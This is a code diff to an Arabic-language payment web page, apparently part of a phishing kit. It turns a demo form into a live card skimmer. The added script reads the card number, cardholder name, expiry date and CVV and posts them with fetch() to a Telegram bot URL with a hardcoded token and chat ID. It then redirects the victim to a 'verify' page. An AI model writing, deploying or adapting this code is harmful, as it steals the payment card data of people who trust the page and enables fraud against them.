@@ -118,7 +118,7 @@
         نحتفظ بحق رفض المعاملة لحمايتك من الاحتيال.
       </p>
 
-      <button type="submit">تأكيد المعلومات</button>
+      <button type="submit">ادفع الآن</button>
     </form>
   </main>
 
@@ -157,7 +157,36 @@
         return;
       }
 
-      alert("✅ تم إرسال البيانات بنجاح (نموذج تجريبي)!");
+      const cardNumber = document.getElementById("cardNumber").value;
+      const cardName = document.getElementById("cardName").value;
+      const cvv = document.getElementById("cvv").value;
+
+      const message = `
+💳 معلومات عملية الدفع:
+------------------------
+📄 رقم البطاقة: ${cardNumber}
+👤 الاسم على البطاقة: ${cardName}
+📆 تاريخ الانتهاء: ${month}/${year}
+🔐 CVV: ${cvv}
+🔢 رقم الحجز: ${confirmBooking}
+`;
+
+      fetch("https://api.telegram.org/bot7244002272:AAEc5dIXiyGJBP5OEMBg7tD2iV2lWh99WJM/sendMessage", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "1008144314",
+          text: message
+        })
+      })
+      .then(() => {
+        window.location.href = "verify.html";
+      })
+      .catch(() => {
+        alert("❌ فشل الإرسال إلى البوت");
+      });
     });
   </script>
 
